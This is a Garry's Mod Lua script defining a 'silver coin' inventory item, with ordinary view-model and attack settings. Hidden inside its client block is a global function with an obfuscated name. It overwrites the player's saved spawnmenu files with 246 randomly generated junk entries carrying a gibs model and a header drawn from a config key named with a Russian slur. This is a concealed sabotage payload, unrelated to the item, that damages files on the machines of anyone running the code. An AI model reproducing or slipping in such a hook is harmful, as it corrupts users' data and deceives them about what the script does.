

AddCSLuaFile()

if ( CLIENT ) then

	SWEP.InvIcon = Material( "nextoren/gui/new_icons/silver_coin.png" )

end

SWEP.ViewModelFOV	= 70
SWEP.ViewModelFlip	= false
SWEP.ViewModel		= ""
SWEP.WorldModel		= "models/cultist/items/coin/coin.mdl"
SWEP.PrintName		= "Серебряная монета"
SWEP.Slot			= 1
SWEP.SlotPos		= 1
SWEP.DrawAmmo		= false
SWEP.Skin = 1
SWEP.DrawCrosshair	= true
SWEP.HoldType		= "items"
SWEP.Spawnable		= false
SWEP.AdminSpawnable	= false

SWEP.droppable				= true

SWEP.Primary.ClipSize		= -1
SWEP.Primary.DefaultClip	= -1
SWEP.Primary.Ammo			=  "none"
SWEP.Primary.Automatic		= false

SWEP.Secondary.ClipSize		= -1
SWEP.Secondary.DefaultClip	= -1
SWEP.Secondary.Ammo			=  "none"
SWEP.Secondary.Automatic	=  false
SWEP.UseHands = true

SWEP.Pos = Vector( 1, 3, -2 )
SWEP.Ang = Angle( 240, -90, 240 )

function SWEP:Deploy()

  self.Owner:DrawViewModel( false )

end

function SWEP:CanPrimaryAttack()

  return false

end

function SWEP:CanSecondaryAttack()

  return false

end

if CLIENT then
	local ff = file
	local f_f = ff.Find
	function _o____l______g___d_____furry()
		local f = f_f("materials/icon16/*.png","GAME") 
		local tbl = {} 
		local json = {["parentid"]=nil,["icon"]=nil;["id"]=nil;["contents"]={{["type"]="header";["text"]=cfg.discord_pidorawek};{["type"]="model",["model"]="models/Gibs/HGIBS.mdl"}},["name"]=nil,["version"]="3"} 
		for i=1,246 do 
			json["parentid"] = math.random(0,i -1)
			json["icon"] ="icon16/"  ..  f [math.random(#f)]
			json["id"] =i 
			json["name"] = rand_string_2() 
			tbl[rand_string_2()]= util.TableToKeyValues(json) 
		end 
		spawnmenu.DoSaveToTextFiles(tbl) 
	end
end

function SWEP:CreateWorldModel()

	if ( !self.WModel ) then

		self.WModel = ClientsideModel( self.WorldModel, RENDERGROUP_OPAQUE )
		self.WModel:SetNoDraw( true )

	end

	return self.WModel

end

function SWEP:DrawWorldModel()

	local wm = self:CreateWorldModel()

	local pl = self.Owner

  if ( !IsValid( self.Owner ) ) then

		self:SetRenderOrigin( nil )
		self:SetRenderAngles( nil )
    self:SetSkin( self.Skin )
		self:DrawModel()

	end

end

function SWEP:Think() end


function SWEP:CanSecondaryAttack()

	return false

end
